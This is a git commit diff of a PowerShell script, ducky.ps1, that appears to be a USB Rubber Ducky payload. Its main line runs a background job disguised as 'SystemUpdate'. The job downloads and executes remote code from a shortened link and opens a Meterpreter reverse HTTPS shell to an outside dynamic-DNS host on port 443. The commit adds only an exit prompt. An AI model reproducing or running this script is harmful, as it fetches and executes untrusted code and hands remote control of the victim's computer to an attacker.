8cad569944b8e44b78c890e82527ca335c672ea5
aden54577 <aden31@live.com.au>
2016-12-21 19:48:43 +1100

    Update ducky.ps1

--- ducky.ps1
+++ ducky.ps1
@@ -1,1 +1,3 @@
 Start-Job -Name SystemUpdate -Scriptblock {IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/2hGPzSC"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost msfducky.ddns.net -Lport 443 -Force}
+
+Read-Host -Prompt "Press Enter to exit"
